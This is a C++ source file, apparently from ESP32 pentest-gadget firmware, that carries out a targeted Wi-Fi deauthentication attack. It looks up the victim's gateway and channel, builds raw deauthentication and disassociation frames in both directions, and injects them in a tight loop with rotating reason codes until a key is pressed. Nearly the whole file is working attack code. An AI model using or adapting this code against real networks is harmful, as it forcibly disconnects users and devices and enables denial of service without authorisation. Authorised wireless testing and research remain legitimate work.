#include "deauther.h"
#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/webInterface.h"
#include "scan_hosts.h"
#include "wifi_atks.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h>
#include <sstream>

// Função para obter o MAC do gateway (Optimized for Safety)
void getGatewayMAC(uint8_t gatewayMAC[6]) {
    memset(gatewayMAC, 0, 6);
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gatewayMAC, ap_info.bssid, 6);
        Serial.print("Gateway MAC: ");
        Serial.println(macToString(gatewayMAC));
    } else {
        Serial.println("Erro ao obter informações do AP.");
    }
}

bool isMACZero(const uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0x00) return false;
    }
    return true;
}

bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
    for (int i = 0; i < 6; i++) {
        if (mac1[i] != mac2[i]) return false;
    }
    return true;
}

int getAPChannel(const uint8_t* target_bssid) {
    int found_channel = 0;

    int numNetworks = WiFi.scanNetworks(false, false);

    for (int i = 0; i < numNetworks; i++) {
        uint8_t* bssid_ptr = WiFi.BSSID(i);

        if (macCompare(bssid_ptr, target_bssid)) {
            found_channel = WiFi.channel(i);
            break;
        }
    }

    WiFi.scanDelete();

    if (found_channel == 0) {
        found_channel = WiFi.channel();
        if (found_channel == 0) found_channel = 1;
    }

    return found_channel;
}

void buildOptimizedDeauthFrame(uint8_t* frame, 
                              const uint8_t* dest,
                              const uint8_t* src,
                              const uint8_t* bssid,
                              uint8_t reason = 0x07,
                              bool is_disassoc = false) {
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;

    frame[2] = 0x00;
    frame[3] = 0x00;

    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);

    static uint16_t seq = 0;
    seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);

    frame[24] = reason;
    frame[25] = 0x00;
}

void stationDeauth(Host host) {
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Not connected to WiFi", true);
        return;
    }
    // Stop WebUI before setting WiFi mode for station deauth
    cleanlyStopWebUiForWiFiFeature();
    
    uint8_t targetMAC[6];
    uint8_t gatewayMAC[6];
    uint8_t victimIP[4];
    for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];

    stringToMAC(host.mac.c_str(), targetMAC);
    if (isMACZero(targetMAC)) {
        displayError("Invalid MAC address", true);
        return;
    }

    getGatewayMAC(gatewayMAC);
    if (isMACZero(gatewayMAC)) {
        displayError("Could not get gateway MAC", true);
        return;
    }

    int channel = getAPChannel(gatewayMAC);

    // Optimized: Use promiscuous mode directly on S3 for raw injection
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauth_ap_to_sta[26];
    uint8_t disassoc_ap_to_sta[26];
    uint8_t deauth_sta_to_ap[26];
    uint8_t disassoc_sta_to_ap[26];

    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, true);
    buildOptimizedDeauthFrame(deauth_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, true);

    drawMainBorderWithTitle("Station Deauth");
    tft.setTextSize(FP);
    padprintln("Trying to deauth one target.");
    padprintln("Tgt:" + host.mac);
    padprintln("Tgt: " + ipToString(victimIP));
    padprintln("GTW:" + macToString(gatewayMAC));
    padprintln("CH:" + String(channel));
    padprintln("Mode: Direct S3 Inject");
    padprintln("");
    padprintln("Press Any key to STOP.");

    long tmp = millis();
    int cont = 0;
    int total_frames = 0;

    uint8_t reason_codes[] = {0x01, 0x04, 0x06, 0x07, 0x08};
    uint8_t current_reason = 0;

    while (!check(AnyKeyPress)) {
        if (cont % 20 == 0) {
            current_reason = (current_reason + 1) % 5;
            deauth_ap_to_sta[24] = reason_codes[current_reason];
            disassoc_ap_to_sta[24] = reason_codes[current_reason];
            deauth_sta_to_ap[24] = reason_codes[current_reason];
            disassoc_sta_to_ap[24] = reason_codes[current_reason];
        }

        // Optimized: Calling esp_wifi_80211_tx directly is more reliable for the S3
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap_to_sta, 26, false);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc_ap_to_sta, 26, false);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
        esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);

        cont += 4;
        total_frames += 4;

        // Optimized: Reduced delay to increase FPS
        delay(10);

        if (millis() - tmp > 1000) {
            int fps = cont;
            cont = 0;
            tmp = millis();

            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
        }
    }

    esp_wifi_set_promiscuous(false);
    wifiDisconnect();
    WiFi.mode(WIFI_STA);

    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    delay(1000);
}